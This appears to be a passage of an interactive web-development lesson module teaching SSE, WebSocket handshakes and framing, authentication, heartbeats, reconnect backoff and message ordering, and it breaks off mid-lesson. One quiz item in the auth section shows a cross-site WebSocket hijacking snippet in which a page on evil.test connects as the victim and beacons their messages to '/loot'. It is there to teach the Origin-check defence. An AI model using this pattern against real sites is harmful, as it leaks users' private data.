const SSE_PARSER = String.raw`// The text/event-stream parser from the HTML spec, fed in network-sized chunks.
function createParser(onEvent) {
  let buf = "", data = "", type = "", lastId = "", retry = null;
  function line(l) {
    if (l === "") {                                   // blank line: dispatch
      if (data === "") { type = ""; return; }
      onEvent({ type: type || "message", data: data.slice(0, -1), lastEventId: lastId });
      data = ""; type = "";
      return;
    }
    if (l[0] === ":") return;                         // comment
    const i = l.indexOf(":");
    const field = i < 0 ? l : l.slice(0, i);
    let value = i < 0 ? "" : l.slice(i + 1);
    if (value[0] === " ") value = value.slice(1);     // strip ONE space
    if (field === "data") data += value + "\n";
    else if (field === "event") type = value;
    else if (field === "id" && !value.includes("\0")) lastId = value;
    else if (field === "retry" && /^\d+$/.test(value)) retry = Number(value);
  }
  return (chunk) => {
    buf += chunk;
    const parts = buf.split(/\r\n|\r|\n/);
    buf = parts.pop();                                // keep the partial line
    parts.forEach(line);
    return { retry, lastId };
  };
}

const stream =
  "retry: 5000\n\n" +
  ": keepalive\n\n" +
  "id: 41\nevent: price\ndata: {\"sym\":\"ACME\",\"px\":101.5}\n\n" +
  "id: 42\ndata: line one\ndata:  line two\n\n" +
  "data\n\n" +
  "id: 43\n\n";

const feed = createParser((e) => console.log(JSON.stringify(e)));
// The network splits bytes wherever it likes. Try 1, 7 and 1000.
const CHUNK = 7;
let state;
for (let i = 0; i < stream.length; i += CHUNK) state = feed(stream.slice(i, i + CHUNK));
console.log("retry:", state.retry, "ms, resume from id:", state.lastId);`;

const SSE_SERVER = `import express from "express";

const app = express();
const clients = new Set();
const recent = [];                    // the last 1000 events, for resume
let seq = 0;

function publish(type, data) {
  seq += 1;
  const frame = \`id: \${seq}\\nevent: \${type}\\ndata: \${JSON.stringify(data)}\\n\\n\`; // format once
  recent.push({ seq, frame });
  if (recent.length > 1000) recent.shift();
  for (const res of clients) res.write(frame);
}

app.get("/events", (req, res) => {
  res.writeHead(200, {
    "Content-Type": "text/event-stream",
    "Cache-Control": "no-cache",
    "X-Accel-Buffering": "no",        // nginx: don't buffer this response
  });
  res.write("retry: 3000\\n\\n");
  const since = req.get("Last-Event-ID") ?? req.query.since;
  if (since !== undefined) {
    const last = Number(since);
    if (recent.length && last < recent[0].seq - 1) res.write(\`event: reset\\ndata: \${seq}\\n\\n\`);
    else for (const e of recent) if (e.seq > last) res.write(e.frame);
  }
  clients.add(res);
  req.on("close", () => clients.delete(res));
});

setInterval(() => { for (const res of clients) res.write(": ping\\n\\n"); }, 15_000);
setInterval(() => publish("price", { sym: "ACME", px: +(100 + Math.random()).toFixed(2) }), 1000);

app.listen(3000, () => console.log("curl -N localhost:3000/events"));`;

const FRAMES = String.raw`// A WebSocket frame, byte by byte (RFC 6455 section 5.2).
function encode(opcode, payload, masked) {
  const n = payload.length;
  const ext = n < 126 ? 0 : n < 65536 ? 2 : 8;
  const out = new Uint8Array(2 + ext + (masked ? 4 : 0) + n);
  out[0] = 0x80 | opcode;                        // FIN = 1, RSV = 0
  out[1] = (masked ? 0x80 : 0) | (ext === 0 ? n : ext === 2 ? 126 : 127);
  const view = new DataView(out.buffer);
  if (ext === 2) view.setUint16(2, n);
  if (ext === 8) view.setBigUint64(2, BigInt(n));
  let p = 2 + ext;
  if (masked) {
    const key = crypto.getRandomValues(new Uint8Array(4));
    out.set(key, p); p += 4;
    for (let i = 0; i < n; i++) out[p + i] = payload[i] ^ key[i % 4];
  } else out.set(payload, p);
  return out;
}

const hex = (b) => [...b].map((x) => x.toString(16).padStart(2, "0")).join(" ");
const text = new TextEncoder().encode("hi");

console.log("server -> client 'hi':", hex(encode(0x1, text, false)));
console.log("client -> server 'hi':", hex(encode(0x1, text, true)));
console.log("client -> server 'hi':", hex(encode(0x1, text, true)), "(new key, new bytes)");
console.log("ping, empty          :", hex(encode(0x9, new Uint8Array(0), false)));
for (const n of [125, 126, 65535, 65536]) {
  const f = encode(0x2, new Uint8Array(n), true);
  console.log("binary " + n + " B, masked: header " + (f.length - n) + " B");
}

// TODO: write decode(bytes) -> { fin, opcode, masked, payload }.
// Unmasking is the same XOR. Check decode(encode(0x1, text, true)).`;

const WS_AUTH = `import http from "node:http";
import crypto from "node:crypto";
import { WebSocketServer } from "ws";

// 1. A normal authenticated HTTP call hands out a one-use ticket.
app.post("/ws-ticket", requireUser, async (req, res) => {
  const ticket = crypto.randomBytes(24).toString("base64url");
  await redis.set(\`wst:\${ticket}\`, req.user.id, { EX: 30 });
  res.json({ ticket });               // client: new WebSocket(\`wss://chat.test/ws?ticket=\${ticket}\`)
});

// 2. The upgrade checks Origin, then burns the ticket.
const ALLOWED = new Set(["https://chat.test"]);
const wss = new WebSocketServer({ noServer: true });
const server = http.createServer(app);

server.on("upgrade", async (req, socket, head) => {
  const ticket = new URL(req.url, "http://x").searchParams.get("ticket");
  const userId = ALLOWED.has(req.headers.origin) && ticket
    ? await redis.getDel(\`wst:\${ticket}\`)    // one use, gone after 30 s
    : null;
  if (!userId) {
    socket.write("HTTP/1.1 401 Unauthorized\\r\\nConnection: close\\r\\n\\r\\n");
    return socket.destroy();
  }
  wss.handleUpgrade(req, socket, head, (ws) => {
    ws.userId = userId;
    wss.emit("connection", ws, req);
  });
});`;

const HEARTBEAT = `// The server drives the heartbeat. Browsers answer pings on their own.
const INTERVAL = 25_000; // under the 60 s idle timeout of nginx and AWS ALB

wss.on("connection", (ws) => {
  ws.isAlive = true;
  ws.on("pong", () => { ws.isAlive = true; });
});

setInterval(() => {
  for (const ws of wss.clients) {
    if (!ws.isAlive) { ws.terminate(); continue; } // missed a whole round
    ws.isAlive = false;
    ws.ping();
  }
}, INTERVAL);`;

const CLIENT = `function connect(url, on, attempt = 0) {
  const ws = new WebSocket(url);
  let openedAt = 0, watchdog = 0, done = false;

  const alive = () => {              // any message counts, heartbeats included
    clearTimeout(watchdog);
    watchdog = setTimeout(() => retry(4000), 60_000); // 2 heartbeats + slack
  };
  function retry(code) {
    if (done) return;
    done = true;
    clearTimeout(watchdog);
    ws.onclose = ws.onmessage = null;
    if (ws.readyState < 2) ws.close(4000, "watchdog");
    if (code === 4001) return on.authFailed();      // get a new token first
    const stable = openedAt && Date.now() - openedAt > 10_000;
    const n = stable ? 0 : attempt + 1;              // reset only after 10 s up
    const wait = Math.random() * Math.min(30_000, 500 * 2 ** n);
    setTimeout(() => connect(url, on, n), wait);
  }
  ws.onopen = () => { openedAt = Date.now(); alive(); on.open(ws); };
  ws.onmessage = (e) => { alive(); on.message(e); };
  ws.onclose = (e) => retry(e.code);
}`;

const HERD = String.raw`// A deploy just closed 5000 sockets at t = 0. Every client runs delay() below.
// The new server finishes 250 handshakes per 100 ms; extra attempts get a 503,
// and those clients wait delay(attempt) and try again.
const BASE = 500, CAP = 30_000;

function delay(attempt) {
  // TODO: exponential backoff with full jitter:
  //   a random wait between 0 and min(CAP, BASE * 2 ** attempt)
  return 1000; // naive: everyone waits exactly one second, every time
}

function simulate(clients = 5000, perTick = 250, tick = 100) {
  let waiting = Array.from({ length: clients }, () => ({ at: delay(0), attempt: 0 }));
  const perSecond = [];
  let t = 0, attempts = 0, peak = 0, done = 0, half = 0;
  while (waiting.length && t < 300_000) {
    const now = waiting.filter((c) => c.at < t + tick);
    waiting = waiting.filter((c) => c.at >= t + tick);
    attempts += now.length;
    peak = Math.max(peak, now.length);
    const s = Math.floor(t / 1000);
    perSecond[s] = (perSecond[s] || 0) + now.length;
    done += Math.min(perTick, now.length);
    if (!half && done >= clients / 2) half = t + tick;
    for (const c of now.slice(perTick)) {        // refused: back off, retry
      c.attempt += 1;
      c.at = t + tick + delay(c.attempt);
      waiting.push(c);
    }
    t += tick;
  }
  console.log("half back at " + half / 1000 + " s, all at " + t / 1000 + " s");
  console.log(attempts + " handshake attempts, peak " + peak + " in one 100 ms tick");
  perSecond.forEach((n, s) => n && console.log(String(s).padStart(3) + "s", "#".repeat(Math.ceil(n / 100)), n));
}

simulate();`;

const RESYNC = String.raw`// Server truth: a counter. Delta #n adds n % 7 + 1. A snapshot is { seq, total }.
const add = (n) => (n % 7) + 1;
const totalAt = (n) => { let t = 0; for (let i = 1; i <= n; i++) t += add(i); return t; };

let state = null, seq = 0, gapSince = null, now = 0;
const held = new Map();                              // seq -> delta, not applicable yet

function apply(d) { state += d.add; seq = d.seq; console.log("  apply #" + d.seq + " -> " + state); }
function drain() {
  while (held.has(seq + 1)) { const d = held.get(seq + 1); held.delete(d.seq); apply(d); }
  for (const k of held.keys()) if (k <= seq) held.delete(k);
  gapSince = held.size ? gapSince ?? now : null;
}
function onDelta(d) {
  if (state !== null && d.seq <= seq) return console.log("  drop #" + d.seq + ", duplicate");
  if (state === null || d.seq > seq + 1) { held.set(d.seq, d); console.log("  hold #" + d.seq); }
  else apply(d);
  drain();
}
function onSnapshot(s) {
  console.log("  snapshot: #" + s.seq + ", total " + s.total);
  state = s.total; seq = s.seq;
  drain();                                           // drops held deltas <= s.seq
}

// What the network delivers. Subscribed at #118; the snapshot comes over HTTP.
const d = (n) => ({ seq: n, add: add(n) });
const events = [
  [0, "delta", d(119)], [10, "delta", d(120)],       // arrive before the snapshot
  [40, "snap", { seq: 119, total: totalAt(119) }],
  [60, "delta", d(121)], [70, "delta", d(123)], [80, "delta", d(122)],
  [90, "delta", d(122)],                             // a retry sent it twice
  [100, "delta", d(125)], [110, "delta", d(126)],    // #124 was lost
];
for (const [t, kind, x] of events) {
  now = t;
  console.log("t=" + t + " " + kind + " #" + x.seq);
  kind === "snap" ? onSnapshot(x) : onDelta(x);
}
now = 1200;
if (gapSince !== null && now - gapSince > 1000) {
  console.log("gap open for " + (now - gapSince) + " ms: resync");
  onSnapshot({ seq: 126, total: totalAt(126) });
}
console.log("client " + state + " at #" + seq + ", server " + totalAt(seq), state === totalAt(seq) ? "match" : "DIVERGED");`;

const BROADCAST = `const HIGH = 1 << 20; // 1 MB queued for one client: it isn't keeping up

function broadcast(room, msg) {
  const data = JSON.stringify(msg);          // once, not once per client
  for (const ws of room.sockets) {
    if (ws.readyState !== ws.OPEN) continue;
    if (ws.bufferedAmount > HIGH) {
      if (msg.kind === "state") continue;    // the next state replaces this one
      ws.close(1013, "too slow");            // chat lines can't be dropped: resync
      continue;
    }
    ws.send(data);
  }
}`;

const RTC = `const signal = new WebSocket("wss://app.test/signal"); // yours: any format
const send = (m) => signal.send(JSON.stringify(m));
const pc = new RTCPeerConnection({
  iceServers: [
    { urls: "stun:stun.app.test:3478" },
    { urls: "turn:turn.app.test:3478", username: "u1", credential: "expires-in-1h" },
  ],
});
pc.onicecandidate = (e) => e.candidate && send({ candidate: e.candidate }); // trickle

async function call() {                                   // peer A
  const ch = pc.createDataChannel("state", { ordered: false, maxRetransmits: 0 });
  ch.onmessage = (e) => console.log(e.data);
  await pc.setLocalDescription(await pc.createOffer());
  send({ sdp: pc.localDescription });
}
pc.ondatachannel = (e) => (e.channel.onmessage = (m) => console.log(m.data)); // peer B

signal.onmessage = async ({ data }) => {
  const m = JSON.parse(data);
  if (m.sdp) {
    await pc.setRemoteDescription(m.sdp);
    if (m.sdp.type === "offer") {                         // peer B answers
      await pc.setLocalDescription(await pc.createAnswer());
      send({ sdp: pc.localDescription });
    }
  } else if (m.candidate) await pc.addIceCandidate(m.candidate);
};`;

const COALESCE_JS = String.raw`const N = 20, RATE = 5000;               // symbols, messages per second
const grid = document.getElementById("grid");
const stats = document.getElementById("stats");
const box = document.getElementById("co");
const cells = [];
for (let i = 0; i < N; i++) cells.push(grid.appendChild(document.createElement("div")));

let msgs = 0, writes = 0, frames = 0, busy = 0, scheduled = false;
const latest = new Map();

function write(i, px) { writes++; cells[i].textContent = "S" + i + " " + px.toFixed(2); }
function flush() { scheduled = false; for (const [i, px] of latest) write(i, px); latest.clear(); }

function onMessage(m) {                  // what ws.onmessage would call
  msgs++;
  if (!box.checked) return write(m.i, m.px);
  latest.set(m.i, m.px);                 // keep only the newest per key
  if (!scheduled) { scheduled = true; requestAnimationFrame(flush); }
}

// A fake socket: RATE messages per second, delivered in bursts every 10 ms.
setInterval(() => {
  const t = performance.now();
  for (let k = 0; k < RATE / 100; k++) onMessage({ i: Math.floor(Math.random() * N), px: 100 + Math.random() });
  busy += performance.now() - t;
}, 10);

(function count() { frames++; requestAnimationFrame(count); })();
setInterval(() => {
  stats.textContent = msgs + " msgs/s, " + writes + " DOM writes/s, " + frames + " frames/s, " + busy.toFixed(1) + " ms in onMessage";
  msgs = writes = frames = busy = 0;
}, 1000);`;

const INTERP_JS = String.raw`const RATE = 100, JITTER = 60, DELAY = 180;    // ms
const c = document.getElementById("c"), g = c.getContext("2d");
const info = document.getElementById("info");
const truth = (t) => ({ x: 160 + 120 * Math.cos(t / 500), y: 110 + 80 * Math.sin(t / 350) });
const snaps = [];                               // arrived snapshots, oldest first
let lastArrive = 0, starved = 0, frames = 0;

// The server samples every RATE ms. Each sample arrives 0..JITTER ms late, in
// order (it's TCP). One-way latency is assumed removed by clock sync.
setInterval(() => {
  const t = performance.now();
  const arrive = Math.max(lastArrive, t + Math.random() * JITTER);
  lastArrive = arrive;
  setTimeout(() => { snaps.push({ t, ...truth(t) }); if (snaps.length > 50) snaps.shift(); }, arrive - t);
}, RATE);

function interp(rt) {
  const last = snaps[snaps.length - 1];
  if (!last) return null;
  if (rt > last.t) { starved++; return last; }  // nothing newer yet: freeze
  for (let i = snaps.length - 1; i > 0; i--) {
    const a = snaps[i - 1], b = snaps[i];
    if (a.t <= rt) {
      const k = (rt - a.t) / (b.t - a.t);
      return { x: a.x + (b.x - a.x) * k, y: a.y + (b.y - a.y) * k };
    }
  }
  return snaps[0];
}
function reckon(now) {                          // extrapolate the last velocity
  const n = snaps.length;
  if (n < 2) return null;
  const a = snaps[n - 2], b = snaps[n - 1], k = (now - b.t) / (b.t - a.t);
  return { x: b.x + (b.x - a.x) * k, y: b.y + (b.y - a.y) * k };
}
function dot(p, color, r = 7) {
  if (!p) return;
  g.fillStyle = color; g.beginPath(); g.arc(p.x, p.y, r, 0, 7); g.fill();
}
requestAnimationFrame(function frame(now) {
  frames++;
  g.clearRect(0, 0, c.width, c.height);
  dot(truth(now), "#ddd", 11);                  // where it really is
  dot(snaps[snaps.length - 1], "#c0392b");      // snap to latest
  dot(interp(now - DELAY), "#2563eb");          // interpolate in the past
  dot(reckon(now), "#16a34a");                  // dead reckoning
  info.textContent = "interp starved on " + starved + " of " + frames + " frames";
  requestAnimationFrame(frame);
});`;

export default {
  id: "realtime",
  n: 25,
  part: "E",
  title: "Real-time: SSE and WebSockets",
  hook: "Opening a socket takes one line. Reconnecting, noticing it died, and never skipping a message is the real job.",
  minutes: 100,
  levels: ["use", "understand", "rebuild"],
  sections: [
    {
      title: "Pick a pipe by its cost",
      beats: [
        { t: "say", x: "In HTTP only the client speaks first. Every real-time technique is a way to keep something open so the server can talk: a request, a response, or a socket. Price them like data structures: cost per idle client, cost per message." },
        {
          t: "table",
          head: ["", "Idle cost per client", "Cost per message", "Direction"],
          rows: [
            ["Polling every T s", "A full request every T, news or not", "A full request and response, often ~1 KB of headers", "Client asks"],
            ["Long polling", "One parked request", "A full response, then a fresh request", "Server answers when it has news"],
            ["SSE", "One response that never ends", "The text plus a few bytes of field names", "Server to client, text only"],
            ["WebSocket", "One TCP socket", "2 to 14 bytes of framing", "Both ways, text or binary"],
            ["WebTransport", "One QUIC connection", "Streams, or unreliable datagrams", "Both ways, no head-of-line blocking"],
          ],
          caption: "Polling also adds T/2 of latency on average. The others deliver as soon as the server writes.",
        },
        {
          t: "predict",
          lang: "text",
          src: "20,000 clients poll GET /notifications every 5 s.\nEach user gets about one notification per hour.",
          q: "Load on the server, and how many responses carry news?",
          options: ["4,000 req/s, about 0.1% carry news", "400 req/s, about 1%", "4,000 req/s, about 10%", "20,000 req/s, about 0.1%"],
          answer: 0,
          why: "20,000 / 5 s = 4,000 requests a second, each with cookies, auth and a DB check. News arrives at 20,000 / 3,600 = 5.6 a second: 99.86% of responses say nothing. And users still wait 2.5 s on average.",
        },
        {
          t: "quiz",
          q: "Long polling. A response just returned; the client hasn't sent the next request yet. An event fires in that gap. What happens?",
          options: ["The server queues it automatically", "It's lost, unless the next request says where it left off: `?since=812`", "TCP holds it for the client", "The browser retries the old request"],
          answer: 1,
          why: "Between responses the server has nobody to send to. A cursor in each request turns the gap into a short delay. The same idea returns as SSE's `Last-Event-ID` and as sequence numbers after a reconnect.",
        },
        { t: "say", h: "WebTransport", x: "HTTP/3 underneath: many independent streams plus unreliable datagrams, so one lost packet stalls nothing else. Safari 26.4 made it Baseline in March 2026. It needs an HTTP/3 server and open UDP, which some networks block, so keep a WebSocket fallback." },
      ],
    },
    {
      title: "SSE: a response that never ends",
      beats: [
        {
          t: "code",
          lang: "http",
          src: "GET /events HTTP/1.1\nAccept: text/event-stream\nLast-Event-ID: 40\n\nHTTP/1.1 200 OK\nContent-Type: text/event-stream\nCache-Control: no-cache\n\nretry: 5000\n\n: keepalive\n\nid: 41\nevent: price\ndata: {\"sym\":\"ACME\",\"px\":101.5}\n\nid: 42\ndata: line one\ndata: line two\n",
          mark: [3, 13, 17],
          note: "An event is `field: value` lines ended by a blank line. Several `data` lines join with `\\n`. A line starting with `:` is a comment, the cheapest keepalive there is.",
        },
        {
          t: "predict",
          lang: "js",
          src: "const es = new EventSource(\"/events\");\nes.onmessage = (e) => console.log(\"message\", e.data);\nes.addEventListener(\"price\", (e) => console.log(\"price\", e.data));\n\n// the server sends:\n// event: price\n// data: 101.5\n//\n// data: hello\n//",
          q: "What gets logged?",
          options: ["`message 101.5` then `message hello`", "`price 101.5` then `message hello`", "`price 101.5` and `message 101.5`, then `message hello`", "Only `message hello`"],
          answer: 1,
          why: "`onmessage` only hears events whose type is `message`, the default. A named event goes only to listeners for that name. Add `event:` on the server and every `onmessage` client goes quiet with no error.",
        },
        {
          t: "play",
          mode: "js",
          title: "the event-stream parser",
          js: SSE_PARSER,
          task: "Set `CHUNK` to 1 and 1000: same events? Then find the bug: a chunk ending in `\\r` followed by one starting with `\\n` gives an extra blank line.",
        },
        {
          t: "steps",
          h: "Resume after a drop",
          items: [
            "Every event carries `id:`. The browser keeps the last id it saw, even across events that had none.",
            "The connection drops: a deploy, a proxy timeout, a phone switching networks.",
            "The browser waits the reconnection time (a few seconds by default, `retry:` overrides it) and reconnects by itself.",
            "The new request carries `Last-Event-ID: 42`. The server replays everything after 42 from a buffer.",
            "If 42 is older than the buffer, replay is impossible. The server sends a `reset` event and the client refetches a snapshot.",
          ],
        },
        {
          t: "play",
          mode: "node",
          title: "an SSE endpoint with resume",
          js: SSE_SERVER,
          task: "Run it, `curl -N localhost:3000/events`, stop curl, then rerun with `-H \"Last-Event-ID: 3\"` and watch events 4 onward replay.",
        },
        {
          t: "pitfall",
          h: "A 502 during a deploy kills EventSource for good",
          x: "The browser retries network errors only. A non-200 status or a wrong Content-Type *fails* the connection: `readyState` goes CLOSED, never to retry. On `error` with CLOSED, recreate it on your own backoff and pass `?since=`: a new EventSource sends no Last-Event-ID.",
        },
        {
          t: "predict",
          lang: "text",
          src: "The site runs on HTTP/1.1.\nEvery tab opens one EventSource to app.test.\nThe user opens a 7th tab.",
          q: "What does the 7th tab see?",
          options: ["It works normally", "Its stream, and every other request to app.test, hangs until a tab closes", "The oldest tab's stream is closed to make room", "The browser falls back to polling"],
          answer: 1,
          why: "Browsers allow 6 HTTP/1.1 connections per host, shared by every tab, and each open stream holds one forever. The site looks down. On HTTP/2 all streams share one connection, usually 100 or more at once.",
        },
        {
          t: "pitfall",
          h: "Buffering proxies hold your events",
          x: "Works on localhost, arrives in bursts of 30 in production. nginx buffers proxied responses by default: send `X-Accel-Buffering: no`. Express's `compression()` waits to fill a window: call `res.flush()` after each event, or skip compression for `text/event-stream`.",
        },
        { t: "say", x: "`EventSource` can only GET and can't set headers. LLM APIs stream SSE in reply to a POST with an `Authorization` header, so their clients use `fetch()` and parse `response.body` with exactly the rules in the parser above." },
      ],
    },
    {
      title: "WebSocket: HTTP that stops being HTTP",
      beats: [
        {
          t: "viz",
          name: "frames",
          props: {
            cols: ["Browser", "On the wire", "Server"],
            frames: [
              { cells: [["new WebSocket(\"wss://chat.test/ws\", [\"chat.v2\"])"], ["TCP + TLS handshakes"], ["listening"]], note: "Connection setup is the same as any HTTPS request. Then comes one ordinary HTTP/1.1 GET." },
              { cells: [["CONNECTING"], ["GET /ws HTTP/1.1", "Upgrade: websocket", "Connection: Upgrade", "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==", "Sec-WebSocket-Version: 13", "Sec-WebSocket-Protocol: chat.v2", "Origin: https://chat.test", "Cookie: sid=9f2c"], []], note: "The key is 16 random bytes in base64. Cookies ride along. Scripts can't set `Sec-` headers, so `fetch` can't forge this." },
              { cells: [["CONNECTING"], [], ["check Origin and cookie", "pick a subprotocol", "base64(SHA-1(key + GUID))"]], note: "The server appends the fixed GUID from RFC 6455, hashes, base64-encodes." },
              { cells: [["CONNECTING"], ["HTTP/1.1 101 Switching Protocols", "Upgrade: websocket", "Connection: Upgrade", "Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=", "Sec-WebSocket-Protocol: chat.v2"], ["now speaking frames"]], note: "The last HTTP on this connection. Any status other than 101 and the page only learns that it failed." },
              { cells: [["Accept matches", "OPEN, `open` fires", "ws.protocol = \"chat.v2\""], [], ["OPEN"]], note: "A wrong Accept, or a subprotocol the page didn't offer, fails the connection. Use subprotocols to version your message format." },
              { cells: [["send(\"hi\")"], ["81 82 [4-byte mask] [2 masked bytes] ->"], ["unmask: hi"]], note: "Client frames are masked with a fresh random key: 8 bytes on the wire for a 2-byte message." },
              { cells: [[], ["<- ping", "pong ->"], ["ping every 25 s"]], note: "The browser answers pings itself. Page JS never sees them and can't send one." },
              { cells: [["close: 1001, wasClean"], ["<- close 1001", "close 1001 ->"], ["deploying: close(1001)", "close TCP"]], note: "Closing is a handshake too: each side sends a close frame, then the server closes TCP." },
            ],
          },
        },
        {
          t: "code",
          lang: "js",
          src: "import { createHash } from \"node:crypto\";\n\nconst GUID = \"258EAFA5-E914-47DA-95CA-C5AB0DC85B11\"; // fixed by RFC 6455\nconst accept = (key) => createHash(\"sha1\").update(key + GUID).digest(\"base64\");\n\nconsole.log(accept(\"dGhlIHNhbXBsZSBub25jZQ==\"));\n// s3pPLMBiTxaQ9kYGzzhZRbK+xOo=",
          note: "The RFC's own example, checked. That key decodes to the ASCII string \"the sample nonce\": 16 bytes.",
        },
        {
          t: "quiz",
          q: "What does `Sec-WebSocket-Accept` protect against?",
          options: ["Someone on the network reading messages", "A cache or a non-WebSocket server sending back a reply that looks like a valid upgrade", "Replay of old sessions", "Forged cookies"],
          answer: 1,
          why: "It's not auth and not crypto: anyone can hash a key they can see. It proves the reply was computed for this handshake by something that understands WebSocket, not replayed by a cache or a confused HTTP server.",
        },
        {
          t: "play",
          mode: "js",
          title: "frames by hand",
          js: FRAMES,
          task: "Write `decode(bytes)`: FIN and opcode from byte 0, mask bit and length from byte 1, the extended length, then unmask. Round-trip a 70,000-byte message.",
        },
        {
          t: "predict",
          lang: "js",
          src: "// in the browser\nws.binaryType = \"arraybuffer\";\nws.send(new Uint8Array(70_000));",
          q: "How many bytes of frame header go on the wire?",
          options: ["2", "6", "10", "14"],
          answer: 3,
          why: "2 base bytes, 8 for the 64-bit length (anything over 65,535 needs it), 4 for the mask key, because every client frame is masked. The same frame from the server costs 10: servers never mask.",
        },
        { t: "say", h: "Masking is not encryption", x: "The key travels in the clear just before the data. Masking exists so a page can't choose the exact bytes on the wire, which could fool a transparent proxy into caching a forged response. A server must reject unmasked client frames." },
        {
          t: "table",
          head: ["Code", "Meaning", "The part people miss"],
          rows: [
            ["1000", "Normal closure", "The only 1xxx code a page may send"],
            ["1001", "Going away", "Server shutting down, or the user leaving the page"],
            ["1006", "Abnormal closure", "Never sent on the wire: reported when the socket died without a close frame"],
            ["1009", "Message too big", "Set a max payload, or one client can fill your RAM"],
            ["1011", "Internal error", "The server hit an exception"],
            ["1012, 1013", "Service restart, try again later", "Registered with IANA: tell clients to back off, then reconnect"],
            ["4000-4999", "Private use", "Your app's codes: 4001 token expired, 4003 kicked"],
          ],
        },
        {
          t: "predict",
          lang: "js",
          src: "// page JS, the user clicked \"leave room\"\nws.close(1001, \"bye\");",
          q: "What happens?",
          options: ["A close frame with 1001 goes out", "It throws an `InvalidAccessError`", "The browser sends 1000 instead", "TCP closes without a close frame"],
          answer: 1,
          why: "Pages may send only 1000 or 3000-4999, with a reason of at most 123 UTF-8 bytes: a control frame holds 125, and the code takes 2. The other 1xxx codes belong to the protocol and the browser.",
        },
        {
          t: "pitfall",
          h: "The browser won't tell you why a handshake failed",
          x: "A 401, a 403, a DNS failure and a refused TLS handshake all look the same to page JS: an `error` event, then close code 1006. The spec hides the difference so pages can't scan networks. To report auth failures, accept the upgrade and close with 4001.",
        },
      ],
    },
    {
      title: "Auth when you can't send headers",
      beats: [
        { t: "say", x: "`new WebSocket(url, protocols)` and `new EventSource(url, { withCredentials })` are the whole API. No headers, so no `Authorization: Bearer`. The credential rides in a cookie, the URL, or the first message. Sessions and tokens are in Auth and security." },
        {
          t: "table",
          head: ["Carrier", "Risk", "Make it safe"],
          rows: [
            ["Cookie, sent with the upgrade", "Cross-site WebSocket hijacking: CORS doesn't apply", "Check `Origin` against an allow-list on every upgrade"],
            ["Query string: `?token=...`", "Lands in access logs, proxy logs and traces", "A single-use ticket that expires in about 30 s"],
            ["First message: `{type: \"auth\"}`", "Unauthenticated sockets hold memory until they speak", "Close if no auth within 5 s; ignore everything before it"],
            ["Packed into `Sec-WebSocket-Protocol`", "A hack: headers get logged too", "Kubernetes does it. Fine when you own every hop"],
          ],
        },
        {
          t: "predict",
          lang: "js",
          src: "// on https://evil.test, while the victim is logged in to chat.test\nconst ws = new WebSocket(\"wss://chat.test/ws\");\nws.onmessage = (e) => navigator.sendBeacon(\"/loot\", e.data);\n\n// chat.test: cookie auth, sid is SameSite=None, no Origin check",
          q: "What happens?",
          options: ["The browser blocks it as cross-origin", "It connects as the victim and leaks their messages to evil.test", "It connects, but anonymously", "A CORS preflight fails"],
          answer: 1,
          why: "WebSocket has no CORS. The handshake carries cookies unless SameSite withholds them: Lax would here, None doesn't, and same-site subdomains always get them. The `Origin` header is the server's one reliable signal.",
        },
        {
          t: "code",
          lang: "js",
          file: "server.js",
          src: WS_AUTH,
          mark: [8, 19, 20],
          note: "The ticket still appears in logs, but it's dead within 30 s and after one use. Note the 401 here reaches page JS only as close code 1006.",
        },
        {
          t: "pitfall",
          h: "The socket outlives the session",
          x: "The ticket was checked once, at 9:00. At 17:00 the user logs out or loses access, and the socket keeps streaming their data. Keep a map from user to sockets, close them with a 4xxx code on logout or role change, and recheck token expiry on a timer.",
        },
      ],
    },
    {
      title: "Staying connected",
      beats: [
        { t: "say", x: "A connection can die without a goodbye: Wi-Fi drops, a NAT box forgets the mapping, a laptop sleeps. No FIN arrives. TCP only notices when it sends, and keepalive on Linux waits 2 hours before its first probe." },
        {
          t: "predict",
          lang: "text",
          src: "A phone enters a tunnel: no packets, no FIN, no RST.\nThe server sends no heartbeats.",
          q: "When does the server's `close` event fire for that socket?",
          options: ["Within a second", "After about 40 s", "When it next writes and TCP gives up, ~15 min on Linux; if it never writes, maybe never", "As soon as the phone gets signal back"],
          answer: 2,
          why: "Linux retransmits for about 15 minutes (`tcp_retries2` = 15) before declaring the peer dead. A socket that only listens has nothing to retransmit. Meanwhile you show a ghost as online and queue messages for it.",
        },
        {
          t: "code",
          lang: "js",
          src: HEARTBEAT,
          mark: [2, 11],
          note: "`terminate()` destroys the socket at once; `close()` would wait on a peer that can't answer. One timer for all sockets, not one per socket.",
        },
        {
          t: "pitfall",
          h: "Idle timeouts close healthy sockets",
          x: "nginx's `proxy_read_timeout` and AWS ALB's idle timeout both default to 60 s. A quiet room drops at 60 s on the dot, every time, and it looks like flaky Wi-Fi. Heartbeat under the smallest idle timeout on the path.",
        },
        {
          t: "code",
          lang: "js",
          file: "client.js",
          src: CLIENT,
          mark: [7, 16, 17],
          note: "Page JS can't ping, so it watches for silence. The backoff resets only after 10 s up: a server that accepts and instantly closes would otherwise be hit at the base delay forever.",
        },
        {
          t: "rebuild",
          h: "Rebuild: backoff that survives a deploy",
          x: "A deploy drops 5,000 sockets at once and the new server can finish 250 handshakes per 100 ms. Every client runs `delay()`. Run the naive version, read the histogram, then implement full jitter and compare.",
          mode: "js",
          js: HERD,
          task: "Implement full jitter. Then try \"equal jitter\" (half fixed, half random) and plain exponential with no jitter. Which one has the worst peak, and why?",
        },
        {
          t: "pitfall",
          h: "Back button, dead feed",
          x: "Since Chrome 148, a page entering the back/forward cache has its WebSockets disconnected instead of being kept out of the cache. Code that connects only on load returns from Back with a frozen feed. Reconnect on `close`, and check `readyState` on `pageshow`.",
        },
      ],
    },
    {
      title: "Order, gaps and resync",
      beats: [
        { t: "say", x: "One socket is one TCP stream, so its messages arrive in send order. Everything around it breaks that: reconnects, two servers publishing, a snapshot fetched over HTTP while deltas stream in. Order has to be a number, not an assumption." },
        {
          t: "predict",
          lang: "text",
          src: "Server A: status = 'packed'  (v5), COMMIT, publish v5\nServer B: status = 'shipped' (v6), COMMIT, publish v6\nB's publish reaches Redis 2 ms before A's.\nClient: render whatever arrives.",
          q: "What does the user see?",
          options: ["shipped", "packed, until the next change", "Both, flickering forever", "An error"],
          answer: 1,
          why: "Commit order and publish order are separate races. v6 renders, then v5 overwrites it. Stamp every change with a version from the database and drop anything not newer than what you hold.",
        },
        {
          t: "viz",
          name: "frames",
          props: {
            cols: ["Socket", "Held deltas", "HTTP", "Client state"],
            frames: [
